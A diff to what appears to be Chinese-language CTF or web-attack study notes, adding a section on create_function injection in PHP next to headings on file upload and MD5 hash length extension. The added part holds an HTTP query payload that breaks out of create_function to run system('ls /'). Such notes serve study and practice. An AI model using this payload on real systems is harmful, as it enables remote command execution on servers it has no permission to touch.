@@ -1,8 +1,6 @@
 
 
 
-
-
 # 文件上传
 
 ## 后缀
@@ -1334,4 +1332,25 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 ```
 # md5的hash扩展攻击
 使用`hashpumpy`可以攻击
+```bash
 
+```
+# create_function函数注入
+
+类似于
+```php
+<?php
+function lambda1($a,$b){
+    return "ln($a) + ln($b) = " . log($a * $b);
+}
+?>
+```
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231215181809.png)
+
+```http
+//第一个参数
+
+?name=){}system('ls /');/*&value=Leaf&
+
+```
